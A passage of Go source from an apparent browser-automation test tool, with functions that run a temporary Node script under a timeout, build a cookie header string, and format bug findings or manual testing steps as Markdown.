	cmd := exec.Command("node", tmpFile)
	cmd.Stdin = nil
	return runWithTimeout(cmd, timeoutSec)
}

func buildCookieString(cookies map[string]string) string {
	if len(cookies) == 0 {
		return ""
	}
	var parts []string
	for k, v := range cookies {
		parts = append(parts, k+"="+v)
	}
	return strings.Join(parts, "; ")
}

// FormatBrowserResults formats browser test results for display
func FormatBrowserResults(results []BrowserTestResult) string {
	var sb strings.Builder
	sb.WriteString("\n## Browser Test Results\n\n")

	bugsFound := 0
	for _, r := range results {
		if r.BugFound {
			bugsFound++
			sb.WriteString(fmt.Sprintf("### 🐛 BUG FOUND: %s\n", r.TestName))
			sb.WriteString(fmt.Sprintf("**Evidence:** %s\n", r.Evidence))
			if r.Screenshot != "" {
				sb.WriteString(fmt.Sprintf("**Screenshot:** %s\n", r.Screenshot))
			}
			sb.WriteString("\n")
		}
	}

	if bugsFound == 0 {
		sb.WriteString("No bugs found via browser automation.\n\n")
		sb.WriteString("## Manual Testing Steps\n\n")
		sb.WriteString("The following tests require manual verification:\n\n")
		for _, r := range results {
			if r.ManualSteps != "" {
				sb.WriteString(r.ManualSteps)
				sb.WriteString("\n\n---\n\n")
			}
		}
	}

	return sb.String()
}
